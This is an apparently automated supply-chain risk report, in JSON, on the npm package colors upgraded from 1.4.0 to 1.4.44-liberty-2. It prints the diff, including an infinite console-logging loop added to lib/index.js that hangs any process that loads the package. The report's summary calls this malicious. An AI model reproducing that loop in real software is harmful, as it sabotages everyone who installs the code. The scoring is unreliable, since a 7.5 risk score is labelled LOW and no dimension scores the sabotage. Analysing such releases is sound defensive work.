@@ -1,0 +1,133 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "npm",
+  "package": "colors",
+  "from_version": "1.4.0",
+  "to_version": "1.4.44-liberty-2",
+  "risk_score": 7.5,
+  "severity": "LOW",
+  "llm_base_score": 2.5,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 0.0,
+      "weight": 0.25,
+      "reasoning": "No network calls, HTTP requests, DNS lookups, or socket connections are introduced in either lib/index.js or lib/custom/american.js. The changes are limited to console.log output and string manipulation.",
+      "confidence": 0.9
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 1.0,
+      "weight": 0.25,
+      "reasoning": "No base64 encoding, eval, or dynamic require patterns are present. The require('./extendStringPrototype') and require('../lib/custom/american') are straightforward static requires. The commented-out line '// console.log(...)' is minor and not suspicious. No meaningful obfuscation detected.",
+      "confidence": 0.9
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 0.0,
+      "weight": 0.2,
+      "reasoning": "No changes to package.json, no postinstall or preinstall scripts are added or modified in this diff.",
+      "confidence": 0.9
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 0.0,
+      "weight": 0.15,
+      "reasoning": "No environment variable checks, platform detection, or CI detection logic is present in either modified or added file.",
+      "confidence": 0.9
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 0.0,
+      "weight": 0.15,
+      "reasoning": "No changes to package.json dependencies are visible. The only new file is a local module (lib/custom/american.js) with no external dependencies.",
+      "confidence": 0.9
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 2 advisory/ies: GHSA-5rqg-jm4f-cqx7, GHSA-gh88-3pxp-6fm8",
+      "url": "https://osv.dev/list?q=colors",
+      "advisory_ids": [
+        "GHSA-5rqg-jm4f-cqx7",
+        "GHSA-gh88-3pxp-6fm8"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "No Sigstore provenance attestation found for colors@1.4.44-liberty-2.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "suspicious",
+      "details": "Score: 2.2/10. Code-Review=2, Maintained=0, Signed-Releases=-1, Branch-Protection=0",
+      "url": "https://scorecard.dev/viewer/?uri=github.com/Marak/colors.js",
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": 2.2
+    }
+  ],
+  "score_modifiers": [
+    {
+      "source": "scorecard",
+      "rule": "scorecard_poor",
+      "delta": 5.0,
+      "note": "Weak OpenSSF Scorecard (2.2/10) amplifies risk"
+    }
+  ],
+  "diff_summary": {
+    "files_added": [
+      "lib/custom/american.js"
+    ],
+    "files_removed": [],
+    "files_modified": [
+      "lib/index.js"
+    ],
+    "file_diffs": [
+      {
+        "path": "lib/index.js",
+        "change_type": "modified",
+        "lines_added": 10,
+        "lines_removed": 0,
+        "unified_diff": "--- a/lib/index.js\n+++ b/lib/index.js\n@@ -11,3 +11,13 @@\n //\n\n //\n\n require('./extendStringPrototype')();\n\n+\n\n+/* remove this line after testing */\n\n+let am = require('../lib/custom/american');\n\n+am();\n\n+for (let i = 666; i < Infinity; i++) {\n\n+  if (i % 333) {\n\n+    // console.log('testing'.zalgo.rainbow)\n\n+  }\n\n+  console.log('testing testing testing testing testing testing testing'.zalgo)\n\n+}\n"
+      },
+      {
+        "path": "lib/custom/american.js",
+        "change_type": "added",
+        "lines_added": 31,
+        "lines_removed": 0,
+        "unified_diff": "+module.exports = function americanFlag () {\n+  console.log('LIBERTY LIBERTY LIBERTY'.yellow);\n+  console.log('LIBERTY LIBERTY LIBERTY'.america);\n+  console.log('LIBERTY LIBERTY LIBERTY'.yellow);\n+  let flag = \"\\\n+  \\\n+                                 !\\\n+             H|H|H|H|H           H__________________________________\\\n+             H|§|§|§|H           H|* * * * * *|---------------------|\\\n+             H|§|∞|§|H           H| * * * * * |---------------------|\\\n+             H|§|§|§|H           H|* * * * * *|---------------------|\\\n+             H|H|H|H|H           H| * * * * * |---------------------|\\\n+             H|H|H|H|H           H|---------------------------------|\\\n+          ===============        H|---------------------------------|\\\n+            /| _   _ |\\          H|---------------------------------|\\\n+            (| O   O |)          H|---------------------------------|\\\n+            /|   U   |\\          H-----------------------------------\\\n+             |  \\=/  |           H\\\n+              \\_..._/            H\\\n+              _|\\I/|_            H\\\n+      _______/\\| H |/\\_______    H\\\n+     /       \\ \\   / /       \\   H\\\n+    |         \\ | | /         |  H\\\n+    |          ||o||          |  H\\\n+    |    |     ||o||     |    |  H\\\n+    |    |     ||o||     |    |  H   Carl Pilcher\\\n+  \";\n+\n+  console.log(flag);\n+\n+}"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 41,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This diff (colors 1.4.0 → 1.4.44-liberty-2) adds a novelty 'American flag' ASCII art module and introduces an infinite loop in lib/index.js that repeatedly calls console.log with the .zalgo text effect. While there are no network calls, credential exfiltration, or obfuscation patterns, the infinite loop ('for (let i = 666; i < Infinity; i++)') is a denial-of-service / resource exhaustion pattern that will hang any process that imports this package. This is consistent with the real-world incident where the colors package author intentionally sabotaged their own package. The change is disruptive and malicious in effect (infinite CPU/stdout consumption) even without classic supply chain exfiltration indicators.",
+  "timestamp": "2026-08-09T03:58:06.886108Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
